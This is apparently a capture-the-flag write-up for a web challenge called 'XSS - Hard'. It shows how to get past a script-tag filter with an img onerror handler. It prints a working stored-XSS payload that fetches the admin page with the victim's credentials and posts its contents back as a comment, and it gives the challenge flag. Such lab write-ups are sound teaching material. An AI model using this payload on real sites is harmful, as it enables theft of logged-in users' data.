# XSS - Hard
Category: Web

## Description
The admin has tried even harder to block JS on the blog.

Can you get the flag from the admin user? He's logged on right now

## Write-up
- Continuing from the [`XSS - Easy`](../xss-easy/README.md) and [`XSS - Medium`](../xss-medium/README.md) challenges, we are no longer able to create comments with `<script>` tags as they get sanitized.
- However, we can still invoke JavaScript logic through the `<img>` tag's `onerror` event handler.
- Our payload should contain an `<img>` tag that points to an invalid URL, triggering the `onerror` event and invoking our malicious logic from the [`XSS - Medium`](../xss-medium/README.md) challenge.
- An example of the payload is:
```
<img src=x onerror="fetch('/admin', {credentials:'include'}).then(res => res.text()).then(res => { let formData = new FormData(); formData.append('name', 'testing'); formData.append('comment', res); fetch('/new-comment', {method: 'POST', body:formData})});" />
```
- After submitting our payload, we can refresh the page and view the flag in one of the blog post's comments.

Flag: `punk_{RGQXJ27QYW15L7TJ}`
